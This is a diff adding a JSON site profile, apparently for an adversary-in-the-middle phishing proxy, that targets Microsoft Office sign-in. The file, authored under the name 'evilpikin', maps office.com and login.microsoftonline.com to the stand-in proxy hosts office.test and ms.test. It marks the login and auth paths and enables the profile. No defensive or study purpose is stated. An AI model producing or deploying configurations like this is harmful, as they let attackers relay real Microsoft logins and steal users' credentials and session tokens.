@@ -1,0 +1,19 @@
+{
+  "id": "office-live",
+  "name": "Microsoft Office (live upstream, post-auth)",
+  "author": "evilpikin",
+  "version": "1.0.0",
+  "proxy_host": "office.test",
+  "origin": "office.com",
+  "login_urls": ["/"],
+  "auth_urls": ["/"],
+  "redirect_url": "/",
+  "force_https": true,
+  "origins": ["office.com", "www.office.com"],
+  "related_domains": {
+    "login.microsoftonline.com": "ms.test"
+  },
+  "enabled": true,
+  "created_at": "2026-08-26T00:00:00Z",
+  "updated_at": "2026-08-26T00:00:00Z"
+}
